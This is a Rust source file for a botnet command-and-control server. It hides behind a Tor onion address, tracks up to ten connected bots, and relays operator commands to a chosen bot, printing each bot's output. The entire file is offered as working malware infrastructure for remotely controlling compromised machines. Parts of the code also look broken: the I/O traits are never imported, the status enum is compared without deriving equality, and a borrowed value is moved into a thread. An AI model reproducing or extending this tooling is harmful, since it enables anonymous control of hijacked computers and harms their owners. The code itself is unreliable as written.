use std::collections::HashMap;
use std::io::{Error, ErrorKind};
use std::net::{TcpListener, TcpStream};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

use tor_rt::{Circuit, OnionAddress, TorClient};

const C2_PORT: u16 = 1234;
const BOT_LIST_MAX: usize = 10;
const BUFFER_SIZE: usize = 1024;

enum BotStatus {
    CONNECTED,
    DISCONNECTED,
}

struct Bot {
    stream: TcpStream,
    status: BotStatus,
}

impl Bot {
    fn new(stream: TcpStream) -> Self {
        Bot {
            stream,
            status: BotStatus::CONNECTED,
        }
    }
}

struct C2Server {
    tor_client: TorClient,
    bot_list: Arc<Mutex<HashMap<usize, Bot>>>,
}

impl C2Server {
    fn new() -> Result<Self, Error> {
        let tor_client = TorClient::new()?;
        // Initialize Tor if needed
        if !tor_client.is_available() {
            tor_client.init()?;
        }

        let address = OnionAddress::generate_v3()?.to_string();
        println!("C2 server is now listening on {}", address);

        let listener = tor_client.listen_on(C2_PORT)?.into_inner();
        let bot_list: Arc<Mutex<HashMap<usize, Bot>>> = Arc::new(Mutex::new(HashMap::new()));

        // Listen for bots to connect
        let bot_list_clone = bot_list.clone();
        thread::spawn(move || {
            let mut index = 0;
            for stream in listener.incoming() {
                match stream {
                    Ok(stream) => {
                        let mut bot_list = bot_list_clone.lock().unwrap();
                        if bot_list.len() >= BOT_LIST_MAX {
                            continue;
                        }

                        let index = index;
                        bot_list.insert(index, Bot::new(stream.try_clone().unwrap()));

                        let addr = stream.peer_addr().unwrap();
                        println!("Bot {} joined the C2. IP address: {}", index, addr);

                        index += 1;
                    }
                    Err(e) => println!("Error accepting connection: {}", e),
                }
            }
        });

        Ok(C2Server {
            tor_client,
            bot_list,
        })
    }

    fn list_bots(&self) -> Vec<usize> {
        let bot_list = &self.bot_list.lock().unwrap();

        let mut bots = Vec::new();
        for (id, bot) in bot_list {
            if bot.status == BotStatus::CONNECTED {
                bots.push(*id);
            }
        }

        bots
    }

    fn send_command(&self, bot_id: usize, command: &str) -> Result<String, Error> {
        let mut bot_list = self.bot_list.lock().unwrap();
        let bot_opt = bot_list.get_mut(&bot_id);

        match bot_opt {
            Some(bot) => {
                if bot.status == BotStatus::DISCONNECTED {
                    return Err(Error::new(
                        ErrorKind::Other,
                        "Bot is currently disconnected.",
                    ));
                }

                bot.stream.write_all(command.as_bytes())?;

                let mut buffer = [0; BUFFER_SIZE];
                let mut response = String::new();
                loop {
                    let bytes_read = bot.stream.read(&mut buffer)?;
                    if bytes_read == 0 {
                        bot.status = BotStatus::DISCONNECTED;
                        break;
                    }
                    let s = String::from_utf8_lossy(&buffer[..bytes_read]);
                    response.push_str(&s);
                }

                Ok(response)
            }
            None => Err(Error::new(
                ErrorKind::Other,
                "Bot ID not found in botnet.",
            )),
        }
    }
}

fn main() -> Result<(), Error> {
    let c2_server = C2Server::new()?;
    let botnet = Arc::new(c2_server);
    let botnet_clone = botnet.clone();

    // Print list of bots in the botnet every 10 seconds
    thread::spawn(move || {
        loop {
            let bots = botnet.list_bots();
            println!("Connected bots: {:?}", bots);
            thread::sleep(Duration::new(10, 0));
        }
    });

    // Provide interface for sending commands to bots
    loop {
        let mut command = String::new();
        print!("> ");
        std::io::stdout().flush()?;
        std::io::stdin().read_line(&mut command)?;

        // Parse command and bot number
        let parts: Vec<&str> = command.trim().splitn(2, ' ').collect();
        if parts.len() < 2 {
            continue;
        }

        let bot_number = match parts[0].parse::<usize>() {
            Ok(n) => n,
            Err(_) => continue,
        };

        let command = parts[1].trim();

        // Send command to bot and print response
        let botnet = botnet_clone.clone();
        thread::spawn(move || {
            match botnet.send_command(bot_number, command) {
                Ok(response) => println!("[Bot {}] {}", bot_number, response),
                Err(e) => println!("{:?}", e),
            }
        });
    }
}